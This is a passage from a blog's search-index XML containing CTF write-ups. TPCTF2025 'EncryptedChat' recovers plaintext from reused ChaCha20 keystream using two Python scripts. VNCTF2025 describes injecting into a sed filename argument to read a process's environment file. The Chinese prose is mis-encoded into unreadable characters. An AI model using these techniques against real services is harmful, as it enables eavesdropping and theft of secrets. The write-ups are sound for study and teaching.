<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>TPCTF2025 EncryptedChat writeup</title>
    <link href="/2025/03/25/TPCTF2025/"/>
    <url>/2025/03/25/TPCTF2025/</url>
    
    <content type="html"><![CDATA[<h2 id="é¢˜ç›®æè¿°"><strong>é¢˜ç›®æè¿°</strong></h2><blockquote><p>This chat service employs robust end-to-end encryption. Some users report that they occasionally receive corrupted text. Nonetheless, security is the top priority, and minor corruption does not compromise confidentiality.</p></blockquote>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-21ac247e" role="button" aria-expanded="false" aria-controls="collapse-21ac247e">        <div class="fold-arrow">â–¶</div>source code      </div>      <div class="fold-collapse collapse" id="collapse-21ac247e">        <div class="fold-content">          <ul><li><p>server.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> socket, AF_INET, SOCK_STREAM<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread, Lock<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">List</span>, <span class="hljs-type">Tuple</span><br><br>PORT = <span class="hljs-number">1337</span><br><br>nonce = get_random_bytes(<span class="hljs-number">12</span>)<br><br>sock = socket(AF_INET, SOCK_STREAM)<br>sock.bind((<span class="hljs-string">&#x27;&#x27;</span>, PORT))<br>sock.listen(<span class="hljs-number">5</span>)<br><br>messages: <span class="hljs-type">List</span>[<span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bytes</span>, socket]] = []<br>clients: <span class="hljs-type">Dict</span>[socket, <span class="hljs-built_in">int</span>] = &#123;&#125;<br>mutex = Lock()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward_messages</span>() -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">with</span> mutex:<br>        <span class="hljs-keyword">for</span> client, pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>(clients.items()):<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">for</span> message, sender <span class="hljs-keyword">in</span> messages[pos:]:<br>                    <span class="hljs-keyword">if</span> sender != client:<br>                        client.sendall(message)<br>                clients[client] = <span class="hljs-built_in">len</span>(messages)<br>            <span class="hljs-keyword">except</span> (ConnectionError, BrokenPipeError):<br>                <span class="hljs-keyword">del</span> clients[client]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_client</span>(<span class="hljs-params">client: socket, addr</span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">global</span> messages<br>    <span class="hljs-keyword">try</span>:<br>        client.sendall(nonce)<br>        forward_messages()<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            message = client.recv(<span class="hljs-number">4096</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> message:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">with</span> mutex:<br>                messages.append((message, client))<br>            forward_messages()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Received message from <span class="hljs-subst">&#123;addr&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">except</span> (ConnectionError, BrokenPipeError):<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-keyword">with</span> mutex:<br>            clients.pop(client, <span class="hljs-literal">None</span>)<br>        client.close()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Connection from <span class="hljs-subst">&#123;addr&#125;</span> closed&#x27;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        client, addr = sock.accept()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;New connection from <span class="hljs-subst">&#123;addr&#125;</span>&#x27;</span>)<br>        <span class="hljs-keyword">with</span> mutex:<br>            clients[client] = <span class="hljs-number">0</span><br>        Thread(target=handle_client, args=(client, addr), daemon=<span class="hljs-literal">True</span>).start()<br><span class="hljs-keyword">except</span> KeyboardInterrupt:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">finally</span>:<br>    sock.close()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;messages.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    stream = <span class="hljs-string">b&#x27;&#x27;</span>.join(m <span class="hljs-keyword">for</span> m, _ <span class="hljs-keyword">in</span> messages)<br>    <span class="hljs-built_in">print</span>(b64encode(stream).decode(), file=f)<br></code></pre></td></tr></table></figure></p></li><li><p>client.py <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ChaCha20<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><span class="hljs-keyword">from</span> select <span class="hljs-keyword">import</span> select<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><br>PORT = <span class="hljs-number">1337</span><br><br>key = os.environ.get(<span class="hljs-string">&#x27;CHAT_KEY&#x27;</span>)<br><span class="hljs-keyword">assert</span> key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;CHAT_KEY environment variable must be set&#x27;</span><br>key = b64decode(key)<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(key) == <span class="hljs-number">32</span>, <span class="hljs-string">&#x27;Key must be 32 bytes long&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Usage: python client.py &lt;server_address&gt;&#x27;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br>server_address = sys.argv[<span class="hljs-number">1</span>]<br><br>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sock.connect((server_address, PORT))<br><br>nonce = sock.recv(<span class="hljs-number">12</span>)<br>cipher = ChaCha20.new(key=key, nonce=nonce)<br><br>sock.setblocking(<span class="hljs-literal">False</span>)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        readable, _, _ = select([sock, sys.stdin], [], [])<br>        <span class="hljs-keyword">if</span> sock <span class="hljs-keyword">in</span> readable:<br>            data = sock.recv(<span class="hljs-number">4096</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                <span class="hljs-keyword">break</span><br>            data = cipher.encrypt(data)<br>            <span class="hljs-built_in">print</span>(data.decode(errors=<span class="hljs-string">&#x27;replace&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> sys.stdin <span class="hljs-keyword">in</span> readable:<br>            data = sys.stdin.readline()<br>            data = cipher.encrypt(data.encode())<br>            sock.sendall(data)<br><span class="hljs-keyword">finally</span>:<br>    sock.close()<br></code></pre></td></tr></table></figure></p></li><li><p><a href="/file/TPCTF2025/messages.txt" download>messages.txt</a></p></li></ul>        </div>      </div>    </div><h2 id="æ¼æ´åˆ©ç”¨"><strong>æ¼æ´åˆ©ç”¨</strong></h2><h3 id="chacha20åŠ å¯†åŸç†"><strong>ChaCha20åŠ å¯†åŸç†</strong></h3><ul><li>å®ä¾‹åŒ–ä¸€ä¸ªåŠ å¯†ç®—æ³•<code>ChaCha20.new(key=key, nonce=nonce)</code>ï¼Œå®ƒä¼šç”¨keyå’Œnonceåˆå§‹åŒ–è‡ªå·±çš„å¯†é’¥æµå¹¶ä¸”é€šè¿‡è¿­ä»£ç”Ÿæˆæ–°çš„å¯†é’¥æµï¼Œå†ç”¨å¯†é’¥æµä¸æ˜æ–‡è¿›è¡Œ<strong>å¼‚æˆ–</strong>å¾—åˆ°å¯†æ–‡ã€‚</li><li>æ–°å¯†é’¥æµè¿­ä»£è¿‡ç¨‹è¯¦è§<a href="https://zhuanlan.zhihu.com/p/12294152293">çŸ¥ä¹</a>ï¼Œåœ¨æœ¬é¢˜ä¸­å¹¶ä¸é‡è¦ã€‚</li></ul><h3 id="ä»£ç è¿è¡Œé€»è¾‘"><strong>ä»£ç è¿è¡Œé€»è¾‘</strong></h3><ul><li>é¢˜ç›®ä½¿ç”¨äº†<code>ChaCha20</code>å¯¹æ¶ˆæ¯è¿›è¡ŒåŠ å¯†ï¼Œserverä¸»è¦è´Ÿè´£å¼€å¯ä¸€ä¸ªèŠå¤©å®¤å¹¶æä¾›<code>nonce</code>ï¼Œclientå…±äº« ChatKey å¹¶åˆ©ç”¨èŠå¤©å®¤æä¾›çš„<code>nonce</code>å®ä¾‹åŒ–ä¸€ä¸ªåŠ å¯†ç®—æ³•<code>cipher = ChaCha20.new(key=key, nonce=nonce)</code>ï¼Œç”±äºæœåŠ¡å™¨æ”¶åˆ°çš„æ¶ˆæ¯éƒ½æ˜¯åŠ å¯†è¿‡åçš„ï¼Œå¹¶ä¸”ä¸çŸ¥é“ ChatKey çš„å†…å®¹ï¼Œå› æ­¤æ— æ³•çœ‹åˆ°æ˜æ–‡;</li><li>clientå¦‚ä½•çœ‹åˆ°å…¶ä»–ä½¿ç”¨è€…çš„æ˜æ–‡å‘¢ï¼Ÿç”±äºå‘é€æ¶ˆæ¯çš„æ—¶å€™å‘é€è€…æ¶ˆè€—äº†<code>ChaCha20</code>çš„éƒ¨åˆ†å¯†é’¥æ®µï¼Œè€Œåœ¨æ¥æ”¶ç«¯ä¼šä½¿ç”¨è¯¥éƒ¨åˆ†å¯†é’¥æ®µæ›²åŠ å¯†å¯†æ–‡ï¼Œç”±äºæ˜¯<strong>å¼‚æˆ–</strong>æ“ä½œï¼Œä¼šæ­£å¸¸æ˜¾ç¤ºæ˜æ–‡ã€‚ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        readable, _, _ = select([sock, sys.stdin], [], [])<br>        <span class="hljs-keyword">if</span> sock <span class="hljs-keyword">in</span> readable:<br>            data = sock.recv(<span class="hljs-number">4096</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                <span class="hljs-keyword">break</span><br>            data = cipher.encrypt(data)<br>            <span class="hljs-built_in">print</span>(data.decode(errors=<span class="hljs-string">&#x27;replace&#x27;</span>), end=<span class="hljs-string">&#x27;&#x27;</span>, flush=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">if</span> sys.stdin <span class="hljs-keyword">in</span> readable:<br>            data = sys.stdin.readline()<br>            data = cipher.encrypt(data.encode())<br>            sock.sendall(data)<br><span class="hljs-keyword">finally</span>:<br>    sock.close()<br></code></pre></td></tr></table></figure></li></ul><h3 id="é¢˜ç›®æç¤ºä¸æ¼æ´å…³é”®"><strong>é¢˜ç›®æç¤ºä¸æ¼æ´å…³é”®</strong></h3><ul><li>å¯ä»¥çœ‹åˆ°åœ¨è§£å¯†å…¶ä»–ä½¿ç”¨è€…å‘é€çš„å¯†æ–‡æ—¶ï¼Œä½¿ç”¨çš„æ˜¯<code>data.decode(errors='replace')</code>ï¼Œè€Œä¸”æè¿°ä¸­ä¹ŸæåŠéƒ¨åˆ†ä½¿ç”¨è€…åæ˜ ä¼šçœ‹åˆ°ä¹±ç ï¼Œè¿™æ˜¯ç”±æ¶ˆæ¯ç«äº‰å¼•èµ·çš„ã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœä¸¤ä¸ªä½¿ç”¨è€…åŒæ—¶å‘é€æŸæ®µæ¶ˆæ¯ï¼Œä¼šå¯¼è‡´åŠ å¯†ä»–ä»¬çš„æ¶ˆæ¯æ—¶ä½¿ç”¨çš„æ˜¯<strong>åŒä¸€æ®µå¯†é’¥æµ</strong>ï¼Œè§£å¯†çš„æ—¶å€™ä¼šæ˜¯<strong>ä¸‹ä¸€æ®µå¯†é’¥æµ</strong>ï¼Œæ‰€ä»¥éƒ½ä¼šæ˜¾ç¤ºä¸ºä¹±ç ï¼›</li><li>ç”±äºåŠ å¯†ä½¿ç”¨äº†<strong>åŒä¸€æ®µå¯†é’¥æµ</strong>ï¼ŒæœåŠ¡å™¨ä¾¿å¯ä»¥é€šè¿‡è¯­ä¹‰åˆ†ææ¥æ¢å¤æ˜æ–‡ã€‚æƒ³è±¡ä¸€ä¸‹ä¸¤æ®µæœ‰è¯­ä¹‰çš„æ˜æ–‡<code>MessageA</code>å’Œ<code>MessageB</code>ï¼Œç»è¿‡åŒä¸€æ®µå¯†é’¥æµ C åŠ å¯†åä¼ ç»™æœåŠ¡å™¨ï¼Œ é‚£ä¹ˆæœåŠ¡å™¨é€šè¿‡å¼‚æˆ–è¿™ä¸¤æ®µå¯†é’¥ä¾¿å¯ä»¥å¾—åˆ° <code>MessageA ^ MessageB</code>çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘çŸ¥é“éƒ¨åˆ†<code>MessageA</code>çš„æ˜æ–‡ï¼Œä¾¿å¯è·å¾—éƒ¨åˆ†<code>MessageB</code>ï¼Œå†æ ¹æ®è¯­ä¹‰åˆ†æçŒœæµ‹æ˜æ–‡åé¢çš„éƒ¨åˆ†ï¼Œä¾¿å¯ä»¥æ¢å¤å‡ºæ•´æ®µæ˜æ–‡ã€‚</li></ul><h3 id="å¯†æ–‡è§£æ"><strong>å¯†æ–‡è§£æ</strong></h3><ul><li>é¢˜ç›®è¿˜ç»™æˆ‘ä»¬ä¸Šäº†å±‚å¼ºåº¦ï¼Œæœ€åæœåŠ¡å™¨æŠŠæ‰€æœ‰å¯†æ–‡ä¸²èµ·æ¥å­˜åˆ°æ–‡æœ¬ä¸­ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬çš„ç›®æ ‡ä¸ä»…æ˜¯æ‰¾å‡ºç‰¹å®šçš„é‡åˆæ®µå¹¶æ¢å¤ æ˜æ–‡ï¼Œè¿˜å¾—æ‰¾å‡ºè¿™ä¸€ä¸²å¯†æ–‡ä¸­ç‰¹å®šå¯†æ–‡çš„èµ·å§‹ä½ç½®ä¸ç»“æŸä½ç½®ã€‚</li><li>è®¾è®¡ä»£ç ï¼Œç”±äº<code>MessageA ^ MessageB</code>çš„æ¯ä¸ªæ¯”ç‰¹çš„æœ€é«˜ä½éƒ½æ˜¯0ï¼Œç”¨æ¥ç¡®å®šå¹¶å‘æ®µçš„ä½ç½®ã€‚ä»å¤´éå†å¯†æ–‡ä¸²ï¼Œè§„å®šæ¶ˆæ¯é—´éš”dï¼Œå­˜å‚¨ç¬¬iä½ä¸ç¬¬i+dä½å¼‚æˆ–çš„ç»“æœï¼Œå¦‚æœå‡ºç°å¤§æ®µæ¯”ç‰¹çš„æœ€é«˜ä½éƒ½æ˜¯0çš„éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥æ–­å®šè¿™å°±æ˜¯å¹¶å‘æ®µçš„ä½ç½®ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;messages.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br>message = base64.b64decode(f)<br><br>maxd = <span class="hljs-number">500</span><br>mind = <span class="hljs-number">50</span><br>indexres = []<br><span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mind,maxd):<br>    res = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(message)-maxd):<br>        res+=<span class="hljs-string">&#x27;@&#x27;</span> <span class="hljs-keyword">if</span> (message[i]^message[i+d])&lt;<span class="hljs-number">128</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27; &#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;@&quot;</span>*mind <span class="hljs-keyword">in</span> res:<br>        <span class="hljs-keyword">for</span> lenth <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mind,maxd):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;@&quot;</span>*lenth <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:<br>                <span class="hljs-keyword">break</span><br>        idx = res.find(<span class="hljs-string">&quot;@&quot;</span>*(lenth-<span class="hljs-number">1</span>))<br>        indexres.append([idx,idx+lenth,idx+d,idx+d+lenth])<br>indexres.sort(key=<span class="hljs-keyword">lambda</span> x:(x[<span class="hljs-number">0</span>],x[<span class="hljs-number">2</span>]))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexres:<br>    <span class="hljs-built_in">print</span>(i)    <span class="hljs-comment"># å¹¶å‘</span><br></code></pre></td></tr></table></figure> <img src="/img/TPCTF2025/TPCTF2025_1.png" alt="alt text" /></li><li>ä»ç»“æœå¯ä»¥çœ‹å‡ºï¼ˆåˆ—è¡¨å‰ä¸¤ä½æ˜¯ç¬¬ä¸€æ®µæ¶ˆæ¯çš„å¼€å¤´ç»“å°¾ä½ç½®ï¼Œåä¸¤ä½æ˜¯ç¬¬äºŒæ®µæ¶ˆæ¯çš„å¼€å¤´ç»“å°¾ä½ç½®ï¼‰ï¼Œæœ‰ä¸¤å¤§å—æ¶ˆæ¯å¹¶å‘çš„æ—¶æœºï¼Œå‰ä¸€æ®µä»1187-3437ï¼Œåä¸€æ®µä»7473-9831ï¼Œæ¯æ¡æ¶ˆæ¯é•¿åº¦å¤§æ¦‚æ˜¯200å­—ç¬¦å·¦å³ã€‚</li></ul><h3 id="æ˜æ–‡æ¢å¤"><strong>æ˜æ–‡æ¢å¤</strong></h3><ul><li>ç¬¬ä¸€å—æ¶ˆæ¯å¹¶å‘çš„æ—¶æœºæ˜æ–‡æ¢å¤å’Œç¬¬äºŒå—çš„æ“ä½œæ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œä»¥ç¬¬ä¸€å—æ¶ˆæ¯ä¸ºä¾‹ã€‚ç°åœ¨æˆ‘ä»¬çš„å·²çŸ¥æ˜æ–‡åªæœ‰<code>TPCTF&#123;</code>ï¼Œå¹¶ä¸”å¹¶ä¸çŸ¥é“å®ƒåœ¨è¿™äº›æ¶ˆæ¯ä¸­çš„ä½ç½®ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡éå†æ‰€æœ‰çš„å¯èƒ½ä½ç½®ï¼Œæ¢å¤å…¶ä»–æ¶ˆæ¯çš„æ˜æ–‡ï¼Œé€šè¿‡å…¶ä»–æ¶ˆæ¯çš„å¯è¯»æ€§æ¥ç¡®å®šä½ç½®ï¼š <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;messages.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>).read()<br>message = base64.b64decode(f)<br><br>msglis1 = [[<span class="hljs-number">1187</span>, <span class="hljs-number">1428</span>],<br>        [<span class="hljs-number">1426</span>, <span class="hljs-number">1708</span>],<br>        [<span class="hljs-number">1726</span>, <span class="hljs-number">2001</span>],<br>        [<span class="hljs-number">2005</span>, <span class="hljs-number">2281</span>],<br>        [<span class="hljs-number">2277</span>, <span class="hljs-number">2736</span>],<br>        [<span class="hljs-number">2737</span>, <span class="hljs-number">2955</span>],<br>        [<span class="hljs-number">2954</span>, <span class="hljs-number">3139</span>],<br>        [<span class="hljs-number">3252</span>, <span class="hljs-number">3437</span>]]<br><br>flag = <span class="hljs-string">b&quot;TPCTF&#123;&quot;</span><br><span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1187</span>,<span class="hljs-number">3437</span>):<br>    <span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> msglis1:<br>        start,end = msg<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(start-<span class="hljs-number">10</span>,end+<span class="hljs-number">9</span>):<br>            tmp = <span class="hljs-string">&quot;&quot;</span><br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag)):<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">chr</span>(message[pos+p]^message[j+p]^flag[p]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> string.printable:<br>                    <span class="hljs-keyword">break</span><br>                tmp += <span class="hljs-built_in">chr</span>(message[pos+p]^message[j+p]^flag[p])<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(pos,start,j-start,tmp)<br></code></pre></td></tr></table></figure> <img src="/img/TPCTF2025/TPCTF2025_2.png" alt="alt text" /></li><li>åœ¨è¾“å‡ºä¸­çœ‹åˆ°å¯ç–‘ç‰‡æ®µï¼Œç»è¿‡åˆ†æå¯ä»¥çœ‹åˆ°<code>TPCTF&#123;</code>åœ¨3042çš„ä½ç½®å¯ä»¥æ¢å¤å‡ºå…¶ä»–æ˜æ–‡ç‰‡æ®µï¼Œè€Œä¸”å…¶ä»–æ˜æ–‡çš„ä½ç½®åˆ†åˆ«ä¸º<code>[1275,1514,1814,2094,2368,2827,3340]</code>ã€‚</li><li>æ¥ä¸‹æ¥æ­¥éª¤å°±æ˜¾è€Œæ˜“è§äº†ï¼Œæ‰©å……å…¶ä»–ä½ç½®çš„è¯­ä¹‰æ¥æ¢å¤flagç‰‡æ®µï¼Œæ¯”å¦‚åœ¨1814çš„ä½ç½®åé¢è‚¯å®šæ˜¯ç©ºæ ¼ç­‰ç­‰ï¼Œè¿‡ç¨‹ä¸å†èµ˜è¿°ï¼ˆè™½ç„¶ä¹Ÿå¾ˆæŠ˜ç£¨ï¼Œä½†æ˜¯è¿˜æ˜¯å¾ˆæœ‰è¶£çš„ï¼‰ã€‚</li><li>è¿™é‡Œå°±åªæ”¾ç¬¬ä¸€å—æ˜æ–‡çš„æ¢å¤ç»“æœï¼Œç¬¬äºŒå—ç»“æœå°±äº¤ç»™è¯»è€…äº†ã€‚ğŸ¥° <img src="/img/TPCTF2025/TPCTF2025_3.png" alt="alt text" /></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF writeup</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF2025 writeup</title>
    <link href="/2025/02/09/VNCTF2025/"/>
    <url>/2025/02/09/VNCTF2025/</url>
    
    <content type="html"><![CDATA[<h1 id="welcome"><strong>Welcome</strong></h1><p>ç­¾åˆ°åšäº†ä¸€ä¸ªå°æ—¶ï¼Œæˆ‘è¿˜æœ‰æ•‘å—ğŸ˜‡</p><h2 id="æ¬¢è¿">æ¬¢è¿</h2><ul><li>æ‰“å¼€ç½‘é¡µæ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçª—å£ï¼Œå¯ä»¥æ‰§è¡ŒsedæŒ‡ä»¤å¯¹æ–‡ä»¶å†…å®¹çš„<code>&#123;&#125;</code>è¿›è¡Œæ›¿æ¢ï¼› <img src="/img/VNCTF2025/VNCTF2025_1.png" alt="alt text" /></li><li>æ›¿æ¢è¯å’Œæ–‡ä»¶åæ˜¯å¯ä»¥æ›´æ”¹çš„ï¼Œå¹¶ä¸”ç»™å‡ºäº†æç¤ºflagåœ¨ç¯å¢ƒå˜é‡å†…éƒ¨ï¼Œä¸€å¼€å§‹çš„æ€è·¯æ˜¯å°†æ›¿æ¢è¯æ”¹ä¸ºç¯å¢ƒå˜é‡ä¸­çš„å˜é‡ï¼Œä½†æ˜¯ç”±äºå•å¼•å·ä¸èƒ½è‡ªåŠ¨å±•å¼€å˜é‡ï¼Œè€Œä¸”æ›¿æ¢è¯å†…è¿‡æ»¤äº†å•å¼•å·çš„é—­åˆ(å¯ä»¥æ‰§è¡Œå¤šæ¡æŒ‡ä»¤)ï¼Œå› æ­¤å¦‚ä¸‹æ–¹æ³•ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼š <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sed <span class="hljs-string">&#x27;s/&#123;.*&#125;/&#x27;</span><span class="hljs-string">&quot;<span class="hljs-variable">$FLAG</span>&quot;</span><span class="hljs-string">&#x27;/g&#x27;</span> ./example.txt<br></code></pre></td></tr></table></figure></li><li>é‚£å°±åªèƒ½åœ¨æ–‡ä»¶åå¤„åŠ¨æ‰‹è„šäº†ï¼Œç›´æ¥è¯»å–è¿›ç¨‹çš„ç¯å¢ƒå˜é‡æ–‡ä»¶ï¼Œå¾—åˆ°flagï¼š <img src="/img/VNCTF2025/VNCTF2025_2.png" alt="alt text" /></li></ul><h1 id="crypto"><strong>Crypto</strong></h1><p>å¤§éƒ¨åˆ†éƒ½æ˜¯çˆ†ç ´ï¼Œæ—¶é—´å·®ç‚¹ä¸å¤ŸğŸ¤ª</p><h2 